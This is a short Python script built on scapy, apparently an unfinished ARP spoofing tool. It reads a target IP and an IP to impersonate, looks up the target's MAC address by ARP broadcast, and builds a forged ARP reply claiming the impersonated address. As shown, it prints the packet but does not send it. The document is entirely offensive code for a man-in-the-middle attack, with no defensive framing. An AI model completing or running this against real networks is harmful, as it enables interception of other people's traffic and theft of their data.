#! /usr/bin/python

import scapy.all as scapy
import optparse

def get_argument():
    parser=optparse.OptionParser()
    parser.add_option("-s", "--source", dest="ip_src", help="Provide the IP wanted to spoof")
    parser.add_option("-t","--target",dest="ip_tar",help="Provide the IP as spoof")
    (options, arugments) = parser.parse_args()
    if not (options.ip_src and options.ip_tar):
        parser.error("Please enter IP to search. Use --help for more information")
    return options

def get_mac(ip):
    arp_request=scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return (answered_list[0][1].hwsrc)


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet= scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    print(packet.show())

options = get_argument()
get_mac(options.ip_tar)
spoof(options.ip_tar,options.ip_src)
